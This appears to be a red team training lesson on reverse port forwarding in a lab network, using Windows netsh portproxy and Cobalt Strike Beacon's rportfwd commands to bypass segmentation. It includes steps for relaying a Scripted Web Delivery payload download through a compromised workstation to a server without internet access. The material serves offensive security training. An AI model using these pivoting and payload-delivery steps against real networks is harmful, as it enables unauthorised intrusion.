Reverse Port Forwarding allows a machine to redirect inbound traffic on a specific port to another IP and port.  A useful implementation of this allows machines to bypass firewall and other network segmentation restrictions, to talk to nodes they wouldn't normally be able to.  Take this very simple example:

Computers A and B can talk to each other, as can B and C; but A and C cannot talk directly.  A reverse port forward on Computer B can act as a "relay" between Computers C and A.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/reverse-port-forward/simple-example.png)

  

There are two main ways to create a reverse port forward:

1.  Windows `netsh`.
2.  Reverse port forward capability built into the C2 framework.

### Windows Firewall

Let's start with the Windows Firewall.

In the lab, there are four domains:  dev.cyberbotic.io, cyberbotic.io, zeropointsecurity.local and subsidiary.external.  Not all of these domains can talk to each other directly - the traffic flow looks a little like this:

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/reverse-port-forward/domain-traffic-flow.png)

  

For instance - cyberbotic.io can talk with dev.cyberbotic.io, but not to subsidiary.external.  So let's use this as an opportunity to create a reverse port forward that will allow _dc-1.cyberbotic.io_ to talk to ad_.subsidiary.external_ via _dc-2.dev.cyberbotic.io_.

> It's not necessary to specifically use domain controllers, it's just a convenience factor here.

First, run the following PowerShell script on the target, _ad.subsidiary.external_:

```powershell
$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 4444)
$listener = New-Object System.Net.Sockets.TcpListener $endpoint
$listener.Start()
Write-Host "Listening on port 4444"
while ($true)
{
  $client = $listener.AcceptTcpClient()
  Write-Host "A client has connected"
  $client.Close()
}
```

  

This will bind port 4444, listen for incoming connections and print a message when something does.  This is how we're going to prove the reverse port forward works.

Try to connect to this port from _dc-1.cyberbotic.io_ and it should fail.

```powershell
PS C:\> hostname
dc-1

PS C:\> Test-NetConnection -ComputerName 10.10.14.55 -Port 4444
WARNING: TCP connect to 10.10.14.55:4444 failed
WARNING: Ping to 10.10.14.55 failed -- Status: TimedOut
```

  

The native `netsh` (short for Network Shell) utility allows you to view and configure various networking components on a machine, including the firewall.  There's a subset of commands called `interface portproxy` which can proxy both IPv4 and IPv6 traffic between networks.

The syntax to add a **v4tov4** proxy is:

```
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
```

Where:

-   **listenaddress** is the IP address to listen on (probably always 0.0.0.0).
-   **listenport** is the port to listen on.
-   **connectaddress** is the destination IP address.
-   **connectport** is the destination port.
-   **protocol** to use (always TCP).

  

On _dc-2.dev.cyberbotic.io_ (the relay), create a portproxy that will listen on 4444 and forward the traffic to _ad.subsidiary.external_, also on 4444.

```powershell
C:\>hostname
dc-2

C:\>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp
```

  

>  You won't see any output from the command, but you can check it's there with `netsh interface portproxy show`.
```powershell
C:\>netsh interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
0.0.0.0         4444        10.10.14.55    4444
```

  

Now, from _dc-1.cyberbotic.io_, instead of trying to connect directly to _ad.subsidiary.external_, connect to this portproxy on _dc-2.dev.cyberbotic.io_ and you will see the connection being made in the PowerShell script.

```powershell
PS C:\> hostname
dc-1

PS C:\> Test-NetConnection -ComputerName 10.10.17.71 -Port 4444

ComputerName     : 10.10.17.71
RemoteAddress    : 10.10.17.71
RemotePort       : 4444
InterfaceAlias   : Ethernet
SourceAddress    : 10.10.15.75
TcpTestSucceeded : True
```

```powershell
PS C:\Users\Administrator\Desktop> hostname
ad

PS C:\Users\Administrator\Desktop> .\listener.ps1
Listening on port 4444
A client has connected
```

  

To remove the portproxy:

```
C:\>netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

  

Aspects to note about netsh port forwards:

-   You need to be a local administrator to add and remove them, regardless of the bind port.
-   They're socket-to-socket connections, so they can't be made through network devices such as firewalls and web proxies.
-   They're particularly good for creating relays between machines.

  

### rportfwd Command

Next, let's look at Beacon's `rportfwd` command.

In the lab and many corporate environments, workstations are able to browse the Internet on ports 80 and 443, but servers have no direct outbound access (because why do they need it?).

Let's imagine that we already have foothold access to a workstation and have a means of moving laterally to a server - we need to deliver a payload to it but it doesn't have Internet access to pull it from our Team Server. We can use the workstation foothold as a relay point between our webserver and the target.

If you don't already have a payload hosted via the Scripted Web Delivery, do so now. Then from _dc-2.dev.cyberbotic.io_, attempt to download it.

```
PS C:\> hostname
dc-2

PS C:\> iwr -Uri http://10.10.5.120/a
iwr : Unable to connect to the remote server
```

  

The syntax for the `rportfwd` command is `rportfwd [bind port] [forward host] [forward port]`. On WKSTN-1:

```
beacon> rportfwd 8080 10.10.5.120 80
[+] started reverse port forward on 8080 to 10.10.5.120:80
```

  

This will bind port **8080** on the foothold machine, which we can see with **netstat**.

```shell
beacon> run netstat -anp tcp

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
```

  

Now any traffic hitting this port will be redirected to **10.10.5.120** on port **80**. On DC-2, instead of trying to hit **10.10.5.120:80**, we use **10.10.17.231:8080** (where 10.10.17.231 is the IP address of WKSTN-1).

```powershell
PS C:\> iwr -Uri http://10.10.17.231:8080/a

StatusCode        : 200
StatusDescription : OK
Content           : $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAAAOy9Wa/qSrIu+rzrV8yHLa21xNo
                    1wIAxR9rSNTYY444eTJ1SyRjjBtw3YM49//1GZBoGY865VtXW1rkPV3dKUwyMnU1kNF9EZoRXTvEfqyLz7UKLT863/9g6We7H0T
                    fm...
```

  

The Web Log in Cobalt Strike also lets us know the request has reached us.

```bash
07/09 16:17:24 visit (port 80) from: 10.10.5.120
	Request: GET /a
	page Scripted Web Delivery (powershell)
	Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.3866
```

  

This is a contrived demo, but we'll see practical examples of using this in modules such as **Group Policy** and **MS SQL Servers**.

To stop the reverse port forward, do `rportfwd stop 8080` from within the Beacon or click the **Stop** button in the **Proxy Pivots** view.

Aspects to note:

-   Beacon's reverse port forward always tunnels the traffic to the Team Server and the Team Server sends the traffic to its intended destination, so shouldn't be used to relay traffic between individual machines.
-   The traffic is tunnelled inside Beacon's C2 traffic, not over separate sockets, and also works over P2P links.
-   You don't need to be a local admin to create reverse port forwards on high ports.

### rportfwd_local

Beacon also has a `rportfwd_local` command.  Whereas `rportfwd` will tunnel traffic to the Team Server, `rportfwd_local` will tunnel the traffic to the machine running the Cobalt Strike client.

This is particularly useful in scenarios where you want traffic to hit tools running on your local system, rather than the Team Server.

Take this Python http server as an example, whilst running the CS client on Kali:

```bash
root@kali:~# echo "This is a test" > test.txt
root@kali:~# python3 -m http.server --bind 127.0.0.1 8080
Serving HTTP on 127.0.0.1 port 8080 (http://127.0.0.1:8080/)
```

```
beacon> rportfwd_local 8080 127.0.0.1 8080
[+] started reverse port forward on 8080 to rasta -> 127.0.0.1:8080
```

  

This will bind port 8080 on the machine running the Beacon and will tunnel the traffic to port 8080 of the localhost running the Cobalt Strike client.  Notice how it uses your username as an indicator of where the traffic will go.

Then on another machine in the network, try to download the file.

```powershell
PS C:\> hostname
wkstn-2

PS C:\> iwr -Uri http://wkstn-1:8080/test.txt

StatusCode : 200
StatusDescription : OK
Content : This is a test
```

  

Of course, we see the request on the Python server.

```bash
root@kali:~# python3 -m http.server --bind 127.0.0.1 8080
Serving HTTP on 127.0.0.1 port 8080 (http://127.0.0.1:8080/) ...
127.0.0.1 - - [23/Jul/2021 19:24:30] "GET /test.txt HTTP/1.1" 200 -
```